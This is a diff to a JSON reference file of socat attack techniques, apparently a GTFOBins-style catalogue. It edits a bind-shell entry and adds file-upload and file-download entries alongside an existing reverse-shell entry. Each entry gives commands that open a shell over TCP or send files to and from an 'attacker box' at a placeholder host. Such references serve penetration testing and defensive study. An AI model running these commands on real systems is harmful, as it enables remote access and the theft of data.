@@ -8,7 +8,7 @@
     ],
     "bind-shell": [
       {
-        "description": "Run 'socat FILE:`tty`,raw,echo=0 TCP:target.com:[port]' on the attacker box to connect to the shell.",
+        "description": "Run 'socat FILE:`tty`,raw,echo=0 TCP:[host]:[port]' on the attacker box to connect to the shell.",
         "code": "socat TCP-LISTEN:[port],reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane\n"
       }
     ],
@@ -22,6 +22,18 @@
       {
         "description": "Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.",
         "code": "./socat tcp-connect:[host]:[port] exec:sh,pty,stderr,setsid,sigint,sane\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Run 'socat -u tcp-listen:[port],reuseaddr open:[file],creat' on the attacker box to collect the file.",
+        "code": "socat -u file:[file] tcp-connect:[host]:[port]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Run 'socat -u file:[file] tcp-listen:[port],reuseaddr' on the attacker box to send the file.",
+        "code": "socat -u tcp-connect:[host]:[port] open:[file],creat\n"
       }
     ]
   }
